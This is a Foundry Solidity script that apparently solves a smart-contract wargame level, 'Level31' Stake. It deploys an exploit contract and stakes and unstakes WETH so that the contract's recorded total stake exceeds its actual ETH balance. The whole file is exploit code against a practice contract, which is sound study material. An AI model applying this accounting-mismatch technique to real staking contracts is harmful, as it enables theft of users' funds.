pragma solidity ^0.8.14;

import {Script, console} from "forge-std/Script.sol";
import {VmSafe} from "forge-std/Vm.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";
import {Stake} from "../src/Level31.sol";
import {StakeExploit} from "../src/Level31Exploit.sol";

contract Level31Script is Script {
    function run() public {
        VmSafe.Wallet memory wallet = vm.createWallet(vm.envUint("PRIVATE_KEY"));
        address payable contractAddress = payable(vm.envAddress("CONTRACT"));

        vm.startBroadcast(wallet.privateKey);
        exploit(contractAddress, wallet.addr);
        vm.stopBroadcast();

        require(levelDone(contractAddress, wallet.addr), "Solution failed");
    }

    function exploit(address _target, address _attacker) private {
        StakeExploit e = new StakeExploit();
        e.exploit{value: 0.001 ether + 2 wei}(payable(_target));

        IERC20(Stake(_target).WETH()).approve(_target, type(uint256).max);
        Stake(_target).StakeWETH(0.001 ether + 1 wei);
        Stake(_target).Unstake(0.001 ether + 1 wei);
    }

    function levelDone(address _target, address _attacker) private returns (bool) {
        return 
            address(_target).balance > 0 &&
            Stake(_target).totalStaked() > address(_target).balance &&
            Stake(_target).Stakers(_attacker) &&
            Stake(_target).UserStake(_attacker) == 0;
    }
}
